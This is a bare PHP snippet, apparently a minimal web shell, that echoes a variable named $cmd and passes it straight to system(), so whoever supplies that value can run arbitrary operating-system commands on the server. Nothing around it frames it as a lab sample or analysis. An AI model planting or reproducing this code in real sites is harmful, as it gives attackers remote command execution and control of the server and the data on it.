<pre>
<?php 
print ("<b>$cmd</b>\n");
system($cmd);
?>
</pre>
